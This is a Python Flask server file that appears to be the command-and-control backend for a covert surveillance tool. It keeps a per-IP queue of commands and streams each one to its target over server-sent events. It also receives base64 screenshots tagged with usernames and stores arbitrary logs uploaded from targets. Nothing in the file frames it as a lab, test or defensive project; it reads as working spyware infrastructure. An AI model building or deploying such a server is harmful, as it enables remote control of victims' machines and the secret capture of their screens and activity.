import time

from flask import Flask, json, request, jsonify, Response
from pymongo import MongoClient
import base64
from gevent import monkey ##
monkey.patch_all()
import os
app = Flask(__name__)
def get_db():
    try:
        client = MongoClient(os.environ.get("MONGO_URI"), connect=False)
        return client['Stealthpoint_DB']
    except Exception as e:
        print(f"Error connecting to MongoDB: {e}")
        return None
db = get_db()
log_collection = db.logs
#s
@app.route("/")
def home():
    return jsonify({"status": "running"}), 200


@app.route('/api/<ip>', methods=['GET'])
def check_command(ip):
    print(f"Checking for commands for IP: {ip.strip()}")
    def check_db_for_command():
        last_check = time.time()
        while True:
            try:
                # Check for new commands
                command = db.commands.find_one_and_delete({"target_ip": ip.strip()})
                print(f"Checked DB for {ip.strip()}, found command: {command}")
                
                if command:
                    # Send command immediately when found
                    data = {
                        "command": command['command'],
                        "timestamp": time.strftime("%Y-%m-%d %H:%M:%S")
                    }
                    yield f"data: {json.dumps(data)}\n\n"
                    print(f"Command sent to {ip}: {command['command']}")
                    
                    # Reset last_check after sending command
                    last_check = time.time()
                
                # Send heartbeat every 15 seconds to keep connection alive
                current_time = time.time()
                if current_time - last_check >= 15:
                    yield f": heartbeat\n\n"  # Comment line (ignored by clients)
                    last_check = current_time
                
                # Small sleep to prevent CPU spinning
                time.sleep(2)  # Check every second instead of 30
                
            except Exception as e:
                print(f"Error in SSE stream for {ip}: {e}")
                # Send error as event (optional)
                yield f"event: error\ndata: {json.dumps({'error': str(e)})}\n\n"
                time.sleep(5)  # Back off on error

        
    return Response (
        check_db_for_command(),
        mimetype="text/event-stream",
        headers={"Cache-Control": "no-cache",
                 "X-Accel-Buffering": "no",
                 "Connection": "keep-alive",
                 "Content-Type": "text/event-stream"}
    )
        
    # return jsonify({"command": None}), 204
#hellos
@app.route('/api/<ip>/screenshot', methods=['POST'])
def receive_screenshot(ip):
    json_data = request.get_json()
    username = json_data.get("username")
    img_bytes = base64.b64decode(json_data["image"])
    db.screenshots.insert_one({
        "username" : username ,
        "target_ip": ip.strip(),
        "screenshot": img_bytes , 
        "timestamp": json_data.get("timestamp")
    })
    return jsonify({"status": "success"}), 200
@app.route('/api/<ip>/logs', methods=['POST'])

def receive_logs(ip):
    logs_json_data = request.get_json()
    log_collection.insert_one(logs_json_data)
    return jsonify({"status": "success"}), 200


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)